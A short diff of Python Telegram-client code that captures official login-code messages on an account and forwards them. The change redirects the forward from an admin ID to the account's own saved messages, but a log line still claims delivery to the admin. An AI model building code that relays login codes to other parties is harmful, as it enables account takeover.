@@ -3409,7 +3409,7 @@ def register_telegram_code_forwarder(client, client_name):
         msg_text = event.raw_text or ""
         print(f"📥 [KOD ALICI] {client_name} Telegram hesabından resmi bir mesaj aldı:\n{msg_text}")
         try:
-            await client.send_message(int(admin_id), f"🔐 **[Giriş Kodu Yakalandı]**\n\nHesap: **{client_name}**\nMesaj:\n`{msg_text}`")
+            await client.send_message('me', f"🔐 **[Giriş Kodu Yakalandı]**\n\nHesap: **{client_name}**\nMesaj:\n`{msg_text}`")
             print(f"📤 [KOD ALICI] Kod başarıyla admin_id {admin_id}'ye iletildi.")
         except Exception as e:
             print(f"⚠️ [KOD ALICI] İletilirken hata: {e}")
